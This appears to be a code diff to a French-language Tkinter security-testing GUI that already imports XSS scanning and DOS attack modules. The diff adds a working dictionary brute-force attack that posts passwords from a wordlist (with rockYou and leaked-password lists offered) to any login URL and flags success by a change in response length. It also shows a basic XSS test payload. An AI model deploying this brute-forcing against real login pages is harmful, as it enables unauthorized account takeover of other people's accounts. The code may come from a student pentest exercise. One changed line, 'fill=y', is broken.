@@ -1,8 +1,11 @@
 from tkinter import *
 from tkinter import ttk
 import tkinter
+
+import requests
 import xss_scanner
 import dos_attack
+import tkinter.filedialog
 
 class App(Tk):
 	def __init__(self, *args, **kwargs):
@@ -79,7 +82,78 @@ class PageOne(Frame):
 		
 
 		frameBruteForceLogin = LabelFrame(self, text = "Analyse des failles du login")
-		frameBruteForceLogin.place(x=30,y=400,height=250,width=500)
+		frameBruteForceLogin.place(x=30,y=350,height=550,width=500)
+
+		Label_password_found= Label(frameBruteForceLogin, bg='#fff',text = "Le mdp trouvé sera affiché ici")
+		Label_password_found.pack()
+
+		#Entrer le lien de la page de login
+
+		Label_login_url = Label(frameBruteForceLogin, text = "Entre le lien de l'url de la requête post du login !")
+		Label_login_url.pack()
+
+		login_url = StringVar()
+		login_entry = ttk.Entry(frameBruteForceLogin, textvariable=login_url)
+		login_entry.pack(fill=X)
+
+
+		#Specifier le mail/username
+
+		Label_login_username = Label(frameBruteForceLogin, text = "Entre le mail/username connu")
+		Label_login_username.pack()
+
+		login_username = StringVar()
+		username_entry= ttk.Entry(frameBruteForceLogin, textvariable=login_username)
+		username_entry.pack(fill=X)
+
+		#Donner la possibilité de choisir le fichier dictionnaire
+
+		Label_choose_dico = Label(frameBruteForceLogin, text = "Choisis le dictionnaire !")
+		Label_choose_dico.pack()
+
+		dictionary_choices = ["top 100 pwd", "rockYou", "LeakedPwd2022"]
+		choicesvar = StringVar(value=dictionary_choices)
+		l_dico = Listbox(frameBruteForceLogin, listvariable=choicesvar)
+		l_dico.pack()
+
+		#Donner la possibilité à l'user d'ajouter un dico 
+
+		def open_file():
+			f_types = [('*.txt')]
+			file_path = tkinter.filedialog.askopenfilename()
+			with open(file_path, 'r') as f:
+				contents = f.read()
+				print(contents)
+
+# Create a button that will trigger the file dialog when clicked
+		button_add_dico = Button(frameBruteForceLogin,text="Open File", command=open_file)
+		button_add_dico.pack()
+
+		#Implémentation du boutton pour lancer l'attaque par dictionaire
+
+		def dico_attack():
+			Label_password_found.configure(text ='Recherche du mdp en cours')
+
+			data_null = {'email':'email', 'password':'password'}
+			response_null = requests.post(login_url.get(),data =data_null)
+			len_null = len(response_null.text)
+
+			with open('Dictionaries/default-passwords.txt','r') as f:
+				for word in f.readlines():
+					password = word.replace("\n","")
+
+					data = {'email':login_username.get(), 'password':password}
+					response = requests.post(login_url.get(),data = data)
+					if len_null != len(response.text):
+						Label_password_found.configure(text ='MDP TROUVE !!!: ' + password)
+						return data
+						
+			Label_password_found.configure(text ='Aucun mdp trouvé :( ')
+			return "end of function"
+
+		
+		button_launch_dico_attack = Button(frameBruteForceLogin,text="Lancer l'attaque", command=dico_attack)
+		button_launch_dico_attack.pack()
 
 
 		labelXSS = Label(frameXSS, text = "les resultats des failles xss apparaissent ici...")
@@ -91,7 +165,7 @@ class PageOne(Frame):
 			if xss_scanner.scan_xss(inputUrl.get()):
 				labelXSS.config(text = "Faille XSS non permanente trouvé !" + "\n" + "Risque elevé" +"\n" + "Attaque utilisé : "+ "<Script>alert('hi')</script>")
 				labelStartSCan = Label(self, text="Fin du scan !")
-				button.pack()
+				button.pack(fill=y)
 
 
 		button = Button(self, text = "Lancer le scan !", command=onClick, bg = "red" , fg = "white")
@@ -136,7 +210,7 @@ class PageTwo(Frame):
 
 		def OnClick_DOS():
 				result_label.config(text="")
-				
+
 			
 
 # Lancer et stopper l'attaque DOS avec le boutton
